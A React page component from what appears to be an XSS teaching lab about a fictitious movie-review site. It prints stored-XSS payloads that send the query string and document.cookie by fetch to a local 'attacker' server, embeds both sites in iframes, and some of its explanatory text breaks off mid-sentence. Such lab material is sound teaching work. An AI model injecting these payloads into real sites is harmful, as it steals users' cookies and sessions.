/* eslint-disable react/no-unescaped-entities */
/* eslint-disable no-unused-vars */
import React from 'react';
import 'tailwindcss/tailwind.css';
import { AiOutlineSearch } from 'react-icons/ai';
import { FaHome } from 'react-icons/fa';
import ParticlesContainer from './lab1/particle';
import { AwesomeButton } from 'react-awesome-button';
import { useNavigate } from 'react-router-dom';

const MovieCenter = () => {
  const Navigate = useNavigate();

  return (
    <>
      <div className="text-gray-400 rounded-lg bg-gray-900 text-pretty container py-2 px-4 m-0 p-0">
        <section className="m-0 p-0">
          <h1 className="text-3xl text-yellow-600 font-bold mt-2 mb-4">Understanding XSS Attacks</h1>
          <p className="m-0 p-0">
            The project implements a specific movie page of a fictitious movie streaming website. Users can add their review to the movie by simply filling in the text box and clicking the submit button. For simplicity, assume that users have already been authenticated, and this is just one specific step in the user's journey on the website.
          </p>
          <p className="m-0 p-0">
            When you add your review, you see it appearing in the comments section. Any other user will see your review.
          </p>
        </section>

        <section className="m-0 p-0">
          <h2 className="text-xl mt-5 font-bold text-yellow-600 mb-4">Injecting Malicious Code</h2>
          <p className="m-0 p-0">
            This website is meant to capture private data from the vulnerable website by exploiting its cross-site scripting vulnerabilities.
          </p>
          {/* Injected script example */}
          <div className="bg-gray-300 rounded p-4 my-4 m-0">
            <p className="text-blue-500 m-0 p-0">
              {"<script>fetch(`http://localhost:4000?data=${encodeURIComponent(window.location.search)}`)</script>"}
            </p>
          </div>
          <div className="bg-gray-300 rounded p-4 my-4 m-0 ">
            <p className="text-blue-500 m-0 p-0">
              {`<script>fetch(\`http://localhost:4000?data=\${document.cookie}\`)</script>`}
            </p>
          </div>
          {/* Explanation */}
          <p className="m-0 p-0">
            At the bottom of the page, you find an empty comment. This may seem harmless, however, if you reload the attacker's website, you will see that it grabbed your current query string:
            the actual attack happens when another user accesses that page of the vulnerable website. So, to simulate a different user, open another tab of your browser in incognito mode or an instance of a different browser. Then navigate to the vulnerable website and add a new review on the movie.

            You will notice that nothing strange happens on the vulnerable website. Your review is appended right below the empty one. However, try to reload the attacker's website. You will see your new review below the previous one:

            Your review has been captured by the attacker without you even realizing it.
          </p>

          <p className="m-0 p-0">
            You may think that capturing reviews is not so interesting, since the review is public anyway. But consider what may happen if you, as the attacker, drop the following code snippet as your review on the movie:

            "As demonstrated, injecting JavaScript using HTML tags like <script /> allows attackers to send HTTP requests, potentially capturing sensitive user data. Other techniques, including CSS and direct JavaScript injection, pose similar risks.

            Upon injection, an empty comment may appear innocuous on the vulnerable website. However, upon reloading the attacker's site, the captured
          </p>
        </section>

        {/* Iframes */}
        <section className="m-0 p-0">
          <h2 className="text-xl font-bold text-yellow-600 mb-4">External Content</h2>
          <div className='mt-2 overflow-hidden w-full bg-gray-400 shadow-md rounded-md p-6 m-0'>
            <iframe
              src="http://localhost:3000"
              title="External Content"
              width="100%"
              height="1000px"
              style={{ overflow: 'hidden' }}
            ></iframe>
          </div>
          <p className='mt-3 text-red-400 font-medium text-2xl'> ○ do refresh to see stolen data!</p>
          <div className='mt-4  bg-gray-400 shadow-md rounded-md p-6 m-0'>
            <iframe
              src="http://localhost:4000"
              title="External Content"
              width="100%"
              height="600px"
              style={{ overflow: 'hidden' }}
            ></iframe>
          </div>
        </section>

        <section className="m-0 mt-3 p-0">
          <h2 className="text-xl font-bold text-yellow-600 mb-4">XSS Defense: Working on Untrusted Data</h2>
          <p className="m-0  p-0">
            Now you have a clearer understanding of how Cross-Site Scripting attacks work. So, the next step is learning how to protect your application from them. You may have been realizing that the main reason for having an XSS vulnerability is the lack of data validation. So, you guessed that the primary defense against XSS attacks is distrusting user input. You have two main strategies:
          </p>
          {/* Strategies for XSS defense */}
        </section>

        {/* Navigation buttons */}
        <div className="flex justify-center mt-4">
          <AwesomeButton onPress={() => { Navigate('/') }} type="primary" className='aws-btnxss'>
            <FaHome /> Home
          </AwesomeButton>
          <AwesomeButton onPress={() => { Navigate('/learn') }} type="primary" className='aws-btnxss'>
            <AiOutlineSearch className="mr-2" /> Labs
          </AwesomeButton>
        </div>


      </div>
      
      {/* Particle container */}
      <ParticlesContainer />
    </>
  );
};

export default MovieCenter;
